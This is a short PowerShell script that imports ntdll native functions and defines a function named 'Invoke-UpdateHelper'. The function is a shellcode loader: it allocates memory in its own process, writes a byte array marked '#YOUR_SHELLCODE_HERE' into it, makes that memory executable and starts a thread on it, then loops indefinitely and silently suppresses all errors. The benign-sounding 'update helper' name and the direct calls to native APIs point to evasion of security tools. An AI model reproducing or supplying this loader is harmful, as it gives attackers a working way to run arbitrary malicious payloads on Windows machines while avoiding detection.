Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NTAPI {
    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(IntPtr hProc, ref IntPtr addr, IntPtr zero, ref IntPtr size, uint type, uint prot);
    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(IntPtr hProc, IntPtr addr, byte[] buf, uint len, ref uint written);
    [DllImport("ntdll.dll")]
    public static extern uint NtProtectVirtualMemory(IntPtr hProc, ref IntPtr addr, ref IntPtr size, uint newProt, ref uint oldProt);
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(out IntPtr hThread, uint access, IntPtr attr, IntPtr hProc, IntPtr start, IntPtr param, bool suspended, uint zeroBits, uint stackSize, uint stackReserve, IntPtr buffer);
}
"@

function Invoke-UpdateHelper {
    try {
        [Byte[]] $data = #YOUR_SHELLCODE_HERE

        $hProc = [IntPtr]::new(-1)
        $size = [IntPtr]$data.Length
        $addr = [IntPtr]::Zero

        [void][NTAPI]::NtAllocateVirtualMemory($hProc, [ref]$addr, [IntPtr]::Zero, [ref]$size, 0x3000, 0x40)
        $written = 0
        [void][NTAPI]::NtWriteVirtualMemory($hProc, $addr, $data, $data.Length, [ref]$written)
        $oldProt = 0
        [void][NTAPI]::NtProtectVirtualMemory($hProc, [ref]$addr, [ref]$size, 0x20, [ref]$oldProt)
        $hThread = [IntPtr]::Zero
        [void][NTAPI]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $hProc, $addr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)

        while ($true) { Start-Sleep -Seconds 60 }
    }
    catch { }
}

